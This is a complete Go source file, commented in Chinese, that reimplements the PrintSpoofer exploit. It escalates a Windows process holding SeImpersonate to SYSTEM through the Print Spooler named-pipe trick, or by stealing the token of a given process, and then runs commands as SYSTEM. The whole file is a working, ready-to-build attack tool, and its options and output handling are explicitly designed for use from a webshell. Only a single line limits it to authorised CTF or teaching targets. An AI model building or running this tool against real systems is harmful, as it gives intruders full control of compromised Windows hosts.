//go:build windows

// Command printspoofer 是 PrintSpoofer（by @itm4n）的 Go 重实现，
// 利用 SeImpersonate 特权，通过 Print Spooler 服务的命名管道模拟技巧把当前进程
// 提权到 SYSTEM，再以 SYSTEM 身份运行命令。
//
// 用法（与 itm4n/PrintSpoofer 兼容，并按本项目 webshell 场景扩展了 -l / -p）：
//
//	PrintSpoofer.exe -c "whoami /priv"   以 SYSTEM 身份运行命令并回显（webshell 推荐）
//	PrintSpoofer.exe -i                   交互式 cmd（需真实控制台，webshell 下无回显）
//	PrintSpoofer.exe -l                   列出捕获到的 SYSTEM 令牌特权（验证是否成功）
//	PrintSpoofer.exe -p <pid>             直接窃取指定进程令牌（不走管道技巧）
//	PrintSpoofer.exe -h                   帮助
//
// 仅用于你自有或持有明确授权的 CTF / 教学靶机。
package main

import (
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modAdvapi32 = windows.NewLazySystemDLL("advapi32.dll")
	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")
	modWinspool = windows.NewLazySystemDLL("winspool.drv")

	procLookupPrivValue = modAdvapi32.NewProc("LookupPrivilegeValueW")
	procLookupPrivName  = modAdvapi32.NewProc("LookupPrivilegeNameW")
	procConvertSD       = modAdvapi32.NewProc("ConvertStringSecurityDescriptorToSecurityDescriptorW")
	procImpersonatePipe = modKernel32.NewProc("ImpersonateNamedPipeClient")
	procCreateProcToken = modAdvapi32.NewProc("CreateProcessWithTokenW")
	procRpcTrigger      = modWinspool.NewProc("RpcRemoteFindFirstPrinterChangeNotificationEx")
)

func fatalf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "[!] "+format+"\n", args...)
	os.Exit(1)
}

func randHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		fatalf("rand: %v", err)
	}
	return hex.EncodeToString(b)
}

// makeSA 构造「Everyone 完全访问」安全描述符，确保 SYSTEM 的 spoolsv 能连上我们建的管道。
func makeSA() (*windows.SecurityAttributes, error) {
	var sd *windows.SECURITY_DESCRIPTOR
	s, err := windows.UTF16PtrFromString("D:(A;;FA;;;WD)")
	if err != nil {
		return nil, err
	}
	r, _, lerr := procConvertSD.Call(
		uintptr(unsafe.Pointer(s)),
		1, // SDDL_REVISION_1
		uintptr(unsafe.Pointer(&sd)),
		0,
	)
	if r == 0 {
		return nil, lerr
	}
	return &windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      1,
	}, nil
}

func lookupPrivValue(name string, luid *windows.LUID) error {
	n, err := windows.UTF16PtrFromString(name)
	if err != nil {
		return err
	}
	r, _, lasterr := procLookupPrivValue.Call(0, uintptr(unsafe.Pointer(n)), uintptr(unsafe.Pointer(luid)))
	if r == 0 {
		return lasterr
	}
	return nil
}

func lookupPrivName(luid windows.LUID) string {
	const max = 256
	name := make([]uint16, max)
	size := uint32(max)
	r, _, _ := procLookupPrivName.Call(
		0,
		uintptr(unsafe.Pointer(&luid)),
		uintptr(unsafe.Pointer(&name[0])),
		uintptr(unsafe.Pointer(&size)),
	)
	if r == 0 {
		return fmt.Sprintf("0x%x", uint64(uint32(luid.HighPart))<<32|uint64(luid.LowPart))
	}
	return windows.UTF16ToString(name[:size])
}

// enableImpersonate 检查并启用当前进程的 SeImpersonate 特权（整个技巧的前提）。
func enableImpersonate() {
	var t windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &t); err != nil {
		fatalf("OpenProcessToken: %v", err)
	}
	defer t.Close()

	var luid windows.LUID
	if err := lookupPrivValue("SeImpersonatePrivilege", &luid); err != nil {
		fatalf("LookupPrivilegeValue(SeImpersonate): %v", err)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: 2}, // SE_PRIVILEGE_ENABLED
		},
	}
	if err := windows.AdjustTokenPrivileges(t, false, &tp, 0, nil, nil); err != nil {
		fatalf("AdjustTokenPrivileges(SeImpersonate): %v", err)
	}
	fmt.Println("[+] SeImpersonate privilege enabled")
}

// spoolerToken 通过 Print Spooler 命名管道技巧获取 SYSTEM 主令牌。
func spoolerToken() (windows.Token, error) {
	name := randHex(16)
	pipeName := `\\.\pipe\` + name + `\pipe\spoolss`
	sa, err := makeSA()
	if err != nil {
		return 0, fmt.Errorf("makeSA: %w", err)
	}
	pn, err := windows.UTF16PtrFromString(pipeName)
	if err != nil {
		return 0, err
	}
	h, err := windows.CreateNamedPipe(
		pn,
		windows.PIPE_ACCESS_DUPLEX|windows.FILE_FLAG_FIRST_PIPE_INSTANCE,
		windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT,
		1, 4096, 4096, 0, sa,
	)
	if err != nil {
		return 0, fmt.Errorf("CreateNamedPipe(%s): %w", pipeName, err)
	}

	computer, _ := windows.ComputerName()
	server := `\\` + computer + `/pipe/` + name
	fmt.Printf("[*] Listening on pipe %s, luring spoolsv (SYSTEM) to connect back to %s ...\n", pipeName, server)

	// 先解析触发函数。显式 Find 而不是直接 Call：LazyProc.Call 内部解析失败会 panic，
	// 把 goroutine 堆栈与构建机路径（C:/Users/.../go/pkg/mod/...）直接暴露到前端。
	// 该导出是 winspool.drv 的未公开内部函数，在较新的 Windows 构建（Win11 /
	// Server 2022+）中已被移除，解析不到时应给出可读提示而非 panic。
	if err := procRpcTrigger.Find(); err != nil {
		windows.CloseHandle(h)
		return 0, fmt.Errorf("cannot resolve RpcRemoteFindFirstPrinterChangeNotificationEx in winspool.drv "+
			"(this undocumented export was removed on newer Windows builds, so the PrintSpoofer pipe trick "+
			"does not apply; check the version with 'ver' and consider a DCOM-based route): %w", err)
	}

	// 先触发 spooler 反向连接，再等待其连上管道。
	go func() {
		time.Sleep(300 * time.Millisecond)
		s, _ := windows.UTF16PtrFromString(server)
		r, _, lerr := procRpcTrigger.Call(0, 0, 0, uintptr(unsafe.Pointer(s)), 0, 0)
		if r != 0 {
			fmt.Fprintf(os.Stderr, "[!] RpcRemoteFindFirstPrinterChangeNotificationEx returned %d (%v)\n", r, lerr)
		}
	}()

	connected := make(chan error, 1)
	go func() { connected <- windows.ConnectNamedPipe(h, nil) }()

	select {
	case err := <-connected:
		if err != nil {
			windows.CloseHandle(h)
			return 0, fmt.Errorf("ConnectNamedPipe: %w (spoolsv did not connect; is the Print Spooler service running?)", err)
		}
	case <-time.After(12 * time.Second):
		windows.CloseHandle(h)
		return 0, fmt.Errorf("timeout: Print Spooler did not connect within 12s (is the service running? do you hold SeImpersonate?)")
	}

	fmt.Println("[+] spoolsv connected to the pipe")
	token, err := getSystemToken(h)
	windows.CloseHandle(h)
	return token, err
}

// getSystemToken 模拟管道客户端（SYSTEM），取出线程令牌并复制为可建进程的主令牌。
func getSystemToken(h windows.Handle) (windows.Token, error) {
	r, _, lerr := procImpersonatePipe.Call(uintptr(h))
	if r == 0 {
		return 0, fmt.Errorf("ImpersonateNamedPipeClient: %w", lerr)
	}
	var t windows.Token
	if err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, false, &t); err != nil {
		windows.RevertToSelf()
		return 0, fmt.Errorf("OpenThreadToken: %w", err)
	}
	var dup windows.Token
	err := windows.DuplicateTokenEx(t, windows.TOKEN_ALL_ACCESS, nil,
		windows.SecurityImpersonation, windows.TokenPrimary, &dup)
	t.Close()
	windows.RevertToSelf()
	if err != nil {
		return 0, fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	return dup, nil
}

// tokenFromPID 直接窃取指定进程的主令牌（需具备相应访问权限，例如 SeDebug）。
func tokenFromPID(pid uint32) (windows.Token, error) {
	h, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return 0, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(h)
	var t windows.Token
	if err := windows.OpenProcessToken(h, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY|windows.TOKEN_ASSIGN_PRIMARY, &t); err != nil {
		return 0, fmt.Errorf("OpenProcessToken(%d): %w", pid, err)
	}
	var dup windows.Token
	if err := windows.DuplicateTokenEx(t, windows.TOKEN_ALL_ACCESS, nil,
		windows.SecurityImpersonation, windows.TokenPrimary, &dup); err != nil {
		t.Close()
		return 0, fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	t.Close()
	return dup, nil
}

func listPrivileges(token windows.Token) {
	var size uint32
	if err := windows.GetTokenInformation(token, windows.TokenPrivileges, nil, 0, &size); err != nil {
		fmt.Fprintf(os.Stderr, "[!] GetTokenInformation(size): %v\n", err)
		return
	}
	buf := make([]byte, size)
	if err := windows.GetTokenInformation(token, windows.TokenPrivileges, &buf[0], size, &size); err != nil {
		fmt.Fprintf(os.Stderr, "[!] GetTokenInformation: %v\n", err)
		return
	}
	count := *(*uint32)(unsafe.Pointer(&buf[0]))
	off := 4
	for i := uint32(0); i < count; i++ {
		luid := *(*windows.LUID)(unsafe.Pointer(&buf[off]))
		attrs := *(*uint32)(unsafe.Pointer(&buf[off+8]))
		off += 12
		state := "disabled"
		switch {
		case attrs&0x2 != 0: // SE_PRIVILEGE_ENABLED
			state = "enabled"
		case attrs&0x1 != 0: // SE_PRIVILEGE_ENABLED_BY_DEFAULT
			state = "enabled by default"
		}
		fmt.Printf("    %-35s %s\n", lookupPrivName(luid), state)
	}
}

func runCommand(token windows.Token, cmd string, interactive bool) error {
	cmdPtr, err := windows.UTF16PtrFromString(cmd)
	if err != nil {
		return err
	}
	si := &windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
	pi := &windows.ProcessInformation{}
	if interactive {
		// 交互模式用 CreateProcessAsUser，继承当前控制台（需真实控制台才有意义）。
		err = windows.CreateProcessAsUser(token, nil, cmdPtr, nil, nil, true, 0, nil, nil, si, pi)
	} else {
		// 非交互模式用 CreateProcessWithTokenW，子进程继承父进程（webshell）的 stdout，便于回显。
		r, _, lerr := procCreateProcToken.Call(
			uintptr(token),
			0, // dwLogonFlags
			0, // lpApplicationName
			uintptr(unsafe.Pointer(cmdPtr)),
			0, // dwCreationFlags
			0, // lpEnvironment
			0, // lpCurrentDirectory
			uintptr(unsafe.Pointer(si)),
			uintptr(unsafe.Pointer(pi)),
		)
		if r == 0 {
			err = lerr
		}
	}
	if err != nil {
		return fmt.Errorf("failed to create SYSTEM process: %w", err)
	}
	windows.WaitForSingleObject(pi.Process, windows.INFINITE)
	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	return nil
}

func usage() {
	fmt.Print(`PrintSpoofer (Go) - SeImpersonate to SYSTEM (Go re-implementation of @itm4n's PrintSpoofer)

Usage:
  PrintSpoofer.exe -c "cmd"     Run a command as SYSTEM and echo its output (recommended for webshell)
  PrintSpoofer.exe -i           Interactive cmd (needs a real console; no output under webshell)
  PrintSpoofer.exe -l           List privileges of the captured SYSTEM token (verification)
  PrintSpoofer.exe -p <pid>     Steal the token of the given PID directly (no pipe trick)
  PrintSpoofer.exe -h           Show this help

Prerequisites: the account must hold SeImpersonate, and the Print Spooler service must
be running (for the default pipe trick).

Note: all output is ASCII-only on purpose. The webshell capture layer decodes command
output using the system ANSI code page, so non-ASCII bytes would show up as mojibake.
`)
}

func main() {
	// 兜底：任何 panic 都转成一行可读错误后退出，而不是把 goroutine 堆栈打到回显里。
	// 堆栈里含构建机路径（如 C:/Users/.../go/pkg/mod/...），既难读也不该暴露到前端。
	defer func() {
		if r := recover(); r != nil {
			fmt.Fprintf(os.Stderr, "[!] internal error: %v\n", r)
			os.Exit(1)
		}
	}()

	cmd := flag.String("c", "", "command to run as SYSTEM (mutually exclusive with -i; defaults to cmd.exe)")
	interactive := flag.Bool("i", false, "interactive mode: spawn cmd.exe (needs a real console)")
	list := flag.Bool("l", false, "list privileges of the captured SYSTEM token (verification)")
	pid := flag.Uint("p", 0, "steal the token of the given PID directly (no pipe trick)")
	help := flag.Bool("h", false, "show this help")
	flag.Parse()

	if *help {
		usage()
		return
	}

	enableImpersonate()

	var token windows.Token
	var err error
	if *pid != 0 {
		fmt.Printf("[*] Stealing the token of PID %d ...\n", *pid)
		token, err = tokenFromPID(uint32(*pid))
	} else {
		token, err = spoolerToken()
	}
	if err != nil {
		fatalf("%v", err)
	}
	defer token.Close()

	if *list {
		fmt.Println("[+] SYSTEM token captured, privileges:")
		listPrivileges(token)
		return
	}

	command := strings.TrimSpace(*cmd)
	withCmd := command != ""
	if !withCmd {
		command = "cmd.exe"
	}
	if *interactive && withCmd {
		fmt.Println("[!] -i and -c given together; running the -c command")
	}
	fmt.Printf("[+] Running as SYSTEM: %s\n", command)
	if err := runCommand(token, command, *interactive && !withCmd); err != nil {
		fatalf("%v", err)
	}
}
